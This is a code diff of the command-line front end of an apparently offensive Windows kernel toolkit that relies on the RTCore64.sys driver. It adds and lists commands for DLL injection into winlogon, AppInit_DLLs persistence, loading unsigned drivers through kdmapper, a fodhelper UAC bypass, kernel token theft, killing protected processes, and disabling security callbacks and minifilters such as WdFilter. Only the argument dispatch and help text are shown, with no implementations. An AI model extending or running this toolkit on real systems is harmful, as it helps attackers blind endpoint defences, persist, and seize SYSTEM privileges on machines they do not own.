@@ -33,80 +33,90 @@ static void Banner() {
 }
 
 static void Usage(const char* prog) {
-    printf(
-        "Usage: %s [/json|?json] [/quiet] <command> [args]\n\n"
-        "  Global flags (can appear anywhere, /flag -flag --flag all accepted):\n"
-        "    /json  --json         Machine-readable JSON output (for agents/scripts)\n"
-        "    /quiet --quiet        Suppress banner\n"
-        "    /debug --debug        Verbose diagnostics (export scan, slot reads)\n\n"
-        "  Process:\n"
-        "    /proc                 List all processes (kernel walk, no ObCallback)\n"
-        "    /kill <pid>           Terminate process (PPL bypass via EPROCESS.Protection)\n\n"
-        "  System:\n"
-        "    /drivers              List loaded kernel modules\n"
-        "    /services [all]       List services (default: running only)\n"
-        "    /net                  TCP/UDP connections with process names\n\n"
-        "  Privilege escalation:\n"
-        "    /runas system <cmd>   Run <cmd> as SYSTEM (token duplication)\n"
-        "    /runas ti     <cmd>   Run <cmd> as TrustedInstaller\n\n"
-        "  ObCallbacks:\n"
-        "    /obcb [process|thread] Enumerate ObRegisterCallbacks\n"
-        "    /disable <PreOp_addr>  Disable callback (zero PreOp/PostOp, Enabled=0)\n"
-        "    /patch <addr> <hex>         Write raw bytes (legacy, unsafe — byte-by-byte)\n"
-        "    /safepatch <addr> <hex>     Safe patch via shadow-page PTE swap\n"
-        "    /restore <addr>             Undo a safepatch (restore original PTE)\n"
-        "    /pte <addr> [--set-write] [--clear-nx] [--restore <val>]\n"
-        "                               Walk all 4 page-table levels; modify leaf PTE flags\n"
-        "    /rd64 <addr> [count]        Read 1-256 QWORDs from a kernel VA\n"
-        "    /wr64 <addr> <value>        Write a QWORD to a kernel VA (atomic if driver supports)\n"
-        "    /ptebase                    Diagnostic scan — find MmPteBase candidates in ntoskrnl\n"
-        "    /ptebase-set <value>        Manually set MmPteBase (use WinDbg to obtain value)\n\n"
-        "  Timing:\n"
-        "    /timedelta <pid> [ms]       Measure transient System handles to <pid>\n\n"
-        "  Guard watchdog:\n"
-        "    /guard-add <addr>           Watch safepatch at <addr>, re-apply if reverted\n"
-        "    /guard-start [interval_ms]  Start background watchdog (default 500ms)\n"
-        "    /guard-stop                 Stop watchdog\n"
-        "    /guard-list                 List guarded patches\n"
-        "    /enable  <PreOp_addr>  Set Enabled=1 on matching entry\n\n"
-        "  NotifyRoutines:\n"
-        "    /notify [image|process|thread]  Enumerate Ps*NotifyRoutine arrays\n"
-        "    /ndisable <fn_addr>             Zero EX_CALLBACK slot for matching entry\n\n"
-        "  File handles:\n"
-        "    /handles [drive]               Enumerate open file handles system-wide (e.g. /handles E)\n"
-        "    /handle-close <pid> <handle>   Close a handle in any process\n"
-        "                                   pid=4: kernel HANDLE_TABLE walk (WdFilter/ksafecenter64)\n"
-        "                                   others: DuplicateHandle CLOSE_SOURCE\n"
-        "    /handle-scan  <pid> [--access <mask>] [--target-pid <pid>] [--close]\n"
-        "                                   Walk pid's kernel HANDLE_TABLE; list/close entries\n"
-        "                                   matching access mask (default: 0x1fffff PROCESS_ALL_ACCESS)\n"
-        "                                   --target-pid: only entries pointing to that PID's EPROCESS\n\n"
-        "  Minifilters:\n"
-        "    /flt [drive]                   Enumerate minifilter instances via kernel walk\n"
-        "    /flt-detach <filter> <drive>   Force-detach mandatory minifilter (zeros teardown callback)\n"
-        "    /unmount <drive>               Force dismount + eject (like /kill for drives)\n"
-        "    /drv-unload <name> <va>        Force-unload NOT_STOPPABLE driver (patch DriverUnload + sc stop)\n"
-        "                                   Get <va> from WinDbg: !object \\Driver\\<name>\n"
-        "    /force-stop <name>             Stop driver via NtUnloadDriver, bypasses SCM error 1052\n"
-        "                                   No VA needed; if DriverUnload is NULL use /drv-unload instead\n"
-        "    /drv-zombie <drvobj_va>        Diagnose STOP_PENDING zombie: dump OBJECT_HEADER PointerCount,\n"
-        "                                   DeviceObject chain, refcount breakdown, and unblock advice\n"
-        "    /elevate-pid <pid>             Kernel token steal: write winlogon SYSTEM token into target pid\n"
-        "                                   Bypasses UAC entirely — use when consent.exe is stuck\n"
-        "    /elevate-self [cmd]            fodhelper UAC bypass: load RTCore64 elevated, no consent dialog\n"
-        "                                   Works as standard user even with Explorer deadlocked\n\n"
-        "  Deep scan:\n"
-        "    /memscan <pid> [all]           Compare DLL sections vs on-disk (default: skip .rdata/.data noise)\n"
-        "    /memrestore <pid> <dll> [sec]  Restore sections from disk (default: skip noisy sections)\n"
-        "    /watchfix <proc> <dll> [sec]   Poll for new instances of <proc>, auto-restore on each launch\n\n"
-        "  Object namespace:\n"
-        "    /objdir [path]                 Enumerate object directory; show kernel addresses\n"
-        "                                   Default path: \\  (root)\n\n"
-        "  Per-command help:\n"
-        "    %s /<command> ?\n\n"
-        "Note: Requires RTCore64.sys running. Install via: sc create RTCore64 ...\n",
-        prog, prog
-    );
+    // Helper: print one line "  /command args    Description"
+    // Padding is done inline via printf so adding new commands is trivial.
+    auto H = [](const char* cmd, const char* desc) {
+        printf("    %-36s %s\n", cmd, desc);
+    };
+
+    printf("Usage: %s [/json] [/quiet] [/debug] <command> [args]\n\n", prog);
+
+    printf("  %sRecon%s\n", A_BOLD, A_RESET);
+    H("/proc",                            "List processes (kernel EPROCESS walk)");
+    H("/drivers",                         "Loaded kernel modules");
+    H("/services [all]",                  "Windows services (default: running)");
+    H("/net",                             "TCP/UDP connections + owning process");
+    H("/dll-list <name>",                 "Find processes with <name> DLL loaded");
+    H("/inj-scan [pid]",                  "Injection artifact scan (reflective, shellcode, orphan thread)");
+    H("/epdump <pid>",                    "Raw EPROCESS field dump");
+    printf("\n");
+
+    printf("  %sCallbacks & Notify%s\n", A_BOLD, A_RESET);
+    H("/obcb [process|thread]",           "Enumerate ObRegisterCallbacks");
+    H("/disable <addr>",                  "Disable ObCallback entry");
+    H("/enable  <addr>",                  "Re-enable ObCallback entry");
+    H("/obcb-install [path]",             "Load obcb_guard.sys (companion PreOp driver)");
+    H("/notify [image|process|thread]",   "Enumerate Ps*NotifyRoutine arrays");
+    H("/notify registry [--kill <drv>]",  "Enumerate/kill CmRegisterCallback routines");
+    H("/ndisable <fn_addr>",              "Zero EX_CALLBACK slot (unregister notify)");
+    printf("\n");
+
+    printf("  %sHandles%s\n", A_BOLD, A_RESET);
+    H("/handles [drive]",                 "Open file handles system-wide");
+    H("/handle-close <pid> <handle>",     "Close a handle (kernel walk for pid=4)");
+    H("/handle-scan <pid> [opts]",        "Kernel HANDLE_TABLE scan (--access --target-pid --close --spin)");
+    H("/timedelta <pid> [ms]",            "Monitor transient System handles (race window)");
+    H("/proc-token <pid>",               "Dump process token details");
+    printf("\n");
+
+    printf("  %sDrivers & Minifilters%s\n", A_BOLD, A_RESET);
+    H("/drv-load <path.sys>",             "Load kernel driver (NtLoadDriver)");
+    H("/drv-unload <name> <drvobj_va>",   "Force-unload (patch DriverUnload + sc stop)");
+    H("/force-stop <name>",               "NtUnloadDriver (bypass SCM error 1052)");
+    H("/drv-zombie <drvobj_va>",          "Diagnose zombie driver refcount");
+    H("/flt [drive]",                     "Minifilter instances (kernel walk)");
+    H("/flt-detach <filter> <drive>",     "Force-detach mandatory minifilter");
+    H("/unmount <drive>",                 "Force dismount + eject volume");
+    H("/objdir [path] [--kva <addr>]",    "Object directory walk (\\Driver, \\Device, ...)");
+    printf("\n");
+
+    printf("  %sMemory & Patching%s\n", A_BOLD, A_RESET);
+    H("/memscan <pid> [all]",             "DLL section integrity check vs disk");
+    H("/memrestore <pid> <dll> [sec]",    "Restore patched sections from disk");
+    H("/watchfix <proc> <t1> [t2] ...",   "Auto-restore on new process launch (continuous)");
+    H("/safepatch <addr> <hex>",          "Shadow-page PTE swap (safe kernel patch)");
+    H("/restore <addr>",                  "Undo a safepatch");
+    H("/guard-add/start/stop/list",       "Watchdog: re-apply safepatch if reverted");
+    H("/patch <addr> <hex>",              "Raw byte write (legacy, unsafe)");
+    H("/pte <addr> [flags]",              "Walk 4-level page table; --set-write --clear-nx --restore");
+    H("/rd64 <addr> [n]",                 "Read QWORDs from kernel VA");
+    H("/wr64 <addr> <value>",             "Write QWORD to kernel VA");
+    H("/ptebase  /ptebase-set <val>",     "MmPteBase discovery / manual override");
+    printf("\n");
+
+    printf("  %sPrivilege & Elevation%s\n", A_BOLD, A_RESET);
+    H("/runas system|ti <cmd>",           "Run as SYSTEM or TrustedInstaller");
+    H("/elevate-self [cmd]",              "fodhelper UAC bypass (no driver)");
+    H("/elevate-pid <pid>",               "Kernel token steal (SYSTEM token -> target)");
+    H("/enable-priv <name>",              "Enable privilege in current token");
+    H("/kill <pid>",                      "Terminate process (PPL bypass)");
+    H("/make-ppl <pid> [level]",          "Set PPL protection level");
+    H("/kill-ppl <pid>",                  "Clear PPL then terminate");
+    printf("\n");
+
+    printf("  %sWinlogon & Desktop%s\n", A_BOLD, A_RESET);
+    H("/wlmon [ms]",                      "Monitor winlogon.exe state (continuous)");
+    H("/wlinject <dll>",                  "Inject DLL into winlogon (APC)");
+    H("/wluninject <dll>",                "Unload DLL from winlogon");
+    H("/wluninject-all <dll> [--force]",  "Unload DLL from ALL processes");
+    H("/wl-sas",                          "Trigger Ctrl+Alt+Del (SAS)");
+    H("/wl-persist / wl-unpersist <dll>", "AppInit_DLLs persistence");
+    H("/wnd [--all] [--all-desktops]",    "Enumerate windows across desktops");
+    H("/wnd-close <hwnd>",               "Dismiss window (WM_CLOSE / IDOK)");
+    printf("\n");
+
+    printf("  Per-command help:  %s /<command> ?\n", prog);
+    printf("  Backend: RTCore64.sys (sc create RTCore64 type=kernel binPath=...)\n\n");
 }
 
 // Per-command help strings
@@ -176,6 +186,20 @@ static bool TryCommandHelp(const char* cmd) {
             "  To disable a callback: /disable <PreOp_hex_addr>\n"
             "  To re-enable:          /enable  <PreOp_hex_addr>\n\n"
             "  Flags: /json  -> JSON array of callback entries\n"
+        );
+        return true;
+    }
+    if (_stricmp(cmd, "obcb-install") == 0) {
+        printf(
+            "/obcb-install [path] — load obcb_guard.sys (real ObCallback PreOp)\n\n"
+            "  Loads the companion driver that registers a real ObRegisterCallbacks\n"
+            "  PreOp entry stripping PROCESS_TERMINATE from handles to processes\n"
+            "  listed in HKLM\\SYSTEM\\CurrentControlSet\\shut (REG_MULTI_SZ).\n\n"
+            "  Loaded via kdmapper (qcu_loader.exe) — no signing, no SCM.\n"
+            "  Uses CustomDriverEntry + borrows \\Driver\\Null (same as qcu_kdrv).\n\n"
+            "  Default path: obcb_guard.sys in same directory as ObMaster.exe\n"
+            "  After load:   /obcb will show the new PreOp entry.\n"
+            "  Remove callback: /disable <PreOp_va>\n"
         );
         return true;
     }
@@ -406,7 +430,7 @@ int main(int argc, char* argv[]) {
             const char* a = argv[i];
             if (strcmp(a, "?") == 0) continue;
             const char* f = stripDashes(a);
-            if (_stricmp(f,"json")==0 || _stricmp(f,"quiet")==0) continue;
+            if (_stricmp(f,"json")==0 || _stricmp(f,"quiet")==0 || _stricmp(f,"close")==0) continue;
             if (found++ == skip) return a;
         }
         return nullptr;
@@ -415,6 +439,11 @@ int main(int argc, char* argv[]) {
     // ── Dispatch ──────────────────────────────────────────────────────────────
     if (_stricmp(cmd, "proc") == 0) {
         CmdProc();
+    }
+    else if (_stricmp(cmd, "proc-token") == 0) {
+        const char* pidStr = nextArg();
+        if (!pidStr) { printf("[!] Usage: /proc-token <pid>\n"); g_drv->Close(); return 1; }
+        CmdProcToken((DWORD)strtoul(pidStr, nullptr, 10));
     }
     else if (_stricmp(cmd, "kill") == 0) {
         const char* pidStr = nextArg();
@@ -439,6 +468,10 @@ int main(int argc, char* argv[]) {
         if (a && _stricmp(a, "process") == 0) thr  = false;
         if (a && _stricmp(a, "thread")  == 0) proc = false;
         CmdObcb(proc, thr);
+    }
+    else if (_stricmp(cmd, "obcb-install") == 0) {
+        const char* path = nextArg(0);  // optional
+        CmdObcbInstall(path ? path : "");
     }
     else if (_stricmp(cmd, "disable") == 0) {
         const char* addrStr = nextArg();
@@ -470,6 +503,11 @@ int main(int argc, char* argv[]) {
         const char* addrStr = nextArg();
         if (!addrStr) { printf("[!] /restore requires an address\n"); g_drv->Close(); return 1; }
         CmdSafePatchRestore(strtoull(addrStr, nullptr, 16));
+    }
+    else if (_stricmp(cmd, "sp-test") == 0) {
+        const char* addrStr = nextArg();
+        if (!addrStr) { printf("[!] /sp-test requires a kernel address\n"); g_drv->Close(); return 1; }
+        CmdSpTest(strtoull(addrStr, nullptr, 16));
     }
     else if (_stricmp(cmd, "timedelta") == 0) {
         const char* pidStr  = nextArg(0);
@@ -522,11 +560,32 @@ int main(int argc, char* argv[]) {
     }
     else if (_stricmp(cmd, "notify") == 0) {
         const char* a = nextArg();
-        bool img = true, proc = true, thr = true;
-        if (a && _stricmp(a, "image")   == 0) { proc = false; thr = false; }
-        if (a && _stricmp(a, "process") == 0) { img  = false; thr = false; }
-        if (a && _stricmp(a, "thread")  == 0) { img  = false; proc = false; }
-        CmdNotify(img, proc, thr);
+        if (a && _stricmp(a, "registry") == 0) {
+            const char* killDrv = nullptr;
+            DWORD64 killKva = 0;
+            bool killUnknown = false;
+            for (int sk = 1; ; sk++) {
+                const char* a2 = nextArg(sk);
+                if (!a2) break;
+                if (_stricmp(a2, "--kill") == 0) {
+                    killDrv = nextArg(++sk);
+                } else if (_stricmp(a2, "--kill-kva") == 0) {
+                    const char* kvaStr = nextArg(++sk);
+                    if (kvaStr) killKva = strtoull(kvaStr, nullptr, 16);
+                } else if (_stricmp(a2, "--kill-unknown") == 0) {
+                    killUnknown = true;
+                } else {
+                    break;
+                }
+            }
+            CmdNotifyRegistry(killDrv, killKva, killUnknown);
+        } else {
+            bool img = true, proc = true, thr = true;
+            if (a && _stricmp(a, "image")   == 0) { proc = false; thr = false; }
+            if (a && _stricmp(a, "process") == 0) { img  = false; thr = false; }
+            if (a && _stricmp(a, "thread")  == 0) { img  = false; proc = false; }
+            CmdNotify(img, proc, thr);
+        }
     }
     else if (_stricmp(cmd, "ndisable") == 0) {
         const char* addrStr = nextArg();
@@ -580,8 +639,13 @@ int main(int argc, char* argv[]) {
         CmdWatchFix(proc, targets);
     }
     else if (_stricmp(cmd, "handles") == 0) {
-        const char* filter = nextArg();
-        CmdHandles(filter);
+        const char* filter = nextArg(0);
+        bool doClose = false;
+        for (int i = cmdIdx + 1; i < argc; i++) {
+            const char* f = stripDashes(argv[i]);
+            if (_stricmp(f, "close") == 0) { doClose = true; break; }
+        }
+        CmdHandles(filter, doClose);
     }
     else if (_stricmp(cmd, "flt") == 0) {
         const char* vol = nextArg();
@@ -802,6 +866,98 @@ int main(int argc, char* argv[]) {
         const char* extra = nextArg(0);  // optional extra command to run after sc start
         CmdElevateSelf(extra ? extra : "");
         return 0;
+    }
+    else if (_stricmp(cmd, "wlmon") == 0) {
+        const char* msStr = nextArg(0);
+        int ms = msStr ? (int)strtoul(msStr, nullptr, 10) : 0;
+        CmdWlMon(ms);
+    }
+    else if (_stricmp(cmd, "wlinject") == 0) {
+        const char* dll = nextArg(0);
+        if (!dll) {
+            printf("[!] Usage: /wlinject <path\\to\\payload.dll>\n");
+            g_drv->Close(); return 1;
+        }
+        CmdWlInject(dll);
+    }
+    else if (_stricmp(cmd, "wluninject") == 0) {
+        const char* dll = nextArg(0);
+        if (!dll) {
+            printf("[!] Usage: /wluninject <dll-name>  (e.g. wlinject_test.dll)\n");
+            g_drv->Close(); return 1;
+        }
+        CmdWlUninject(dll);
+    }
+    else if (_stricmp(cmd, "wnd") == 0) {
+        bool all = false, allDesktops = false;
+        for (int i = 0; i < argc; i++) {
+            if (_stricmp(argv[i], "--all") == 0)          all = true;
+            if (_stricmp(argv[i], "--all-desktops") == 0) allDesktops = true;
+        }
+        CmdWnd(all, allDesktops);
+    }
+    else if (_stricmp(cmd, "wnd-close") == 0) {
+        const char* hwndStr = nextArg(0);
+        if (!hwndStr) {
+            printf("[!] Usage: /wnd-close <hwnd_hex>  (e.g. /wnd-close 0x1A2B3C)\n");
+            g_drv->Close(); return 1;
+        }
+        DWORD64 hwndVal = strtoull(hwndStr, nullptr, 16);
+        CmdWndClose(hwndVal);
+    }
+    else if (_stricmp(cmd, "wl-sas") == 0) {
+        CmdWlSas();
+    }
+    else if (_stricmp(cmd, "wl-persist") == 0) {
+        const char* dll = nextArg(0);
+        if (!dll) {
+            printf("[!] Usage: /wl-persist <path\\to\\payload.dll>\n");
+            g_drv->Close(); return 1;
+        }
+        CmdWlPersist(dll);
+    }
+    else if (_stricmp(cmd, "wl-unpersist") == 0) {
+        const char* dll = nextArg(0);
+        if (!dll) {
+            printf("[!] Usage: /wl-unpersist <dll-name-or-path>\n");
+            g_drv->Close(); return 1;
+        }
+        CmdWlUnpersist(dll);
+    }
+    else if (_stricmp(cmd, "dll-list") == 0) {
+        const char* name = nextArg(0);
+        if (!name) {
+            printf("[!] Usage: /dll-list <dll-name>\n");
+            g_drv->Close(); return 1;
+        }
+        CmdDllList(name);
+    }
+    else if (_stricmp(cmd, "inj-scan") == 0) {
+        const char* pidStr = nextArg(0);
+        DWORD pid = pidStr ? (DWORD)strtoul(pidStr, nullptr, 10) : 0;
+        CmdInjScan(pid);
+    }
+    else if (_stricmp(cmd, "wluninject-all") == 0) {
+        const char* dll = nextArg(0);
+        if (!dll) {
+            printf("[!] Usage: /wluninject-all <dll-name>\n");
+            g_drv->Close(); return 1;
+        }
+        bool force = false;
+        for (int i = 1; ; i++) { const char* a = nextArg(i); if (!a) break; if (!_stricmp(a,"--force")) force=true; }
+        CmdWlUnloadAll(dll, force);
+    }
+    else if (_stricmp(cmd, "kill-ppl") == 0) {
+        const char* pidStr = nextArg(0);
+        if (!pidStr) { printf("[!] Usage: /kill-ppl <pid>\n"); g_drv->Close(); return 1; }
+        CmdKillPpl((DWORD)strtoul(pidStr, nullptr, 10));
+    }
+    else if (_stricmp(cmd, "make-ppl") == 0) {
+        const char* pidStr = nextArg(0);
+        if (!pidStr) { printf("[!] Usage: /make-ppl <pid> [level]\n  level: 0x21=PPL-WinTcb 0x41=PPL-AM 0x61=PPL-Win(default) 0x72=PP-WinTcb\n"); g_drv->Close(); return 1; }
+        const char* lvlStr = nextArg(1);
+        BYTE level = lvlStr ? (BYTE)strtoul(lvlStr, nullptr, 16) : 0;
+        CmdMakePpl((DWORD)strtoul(pidStr, nullptr, 10), level);
     }
     else {
         if (g_jsonMode)
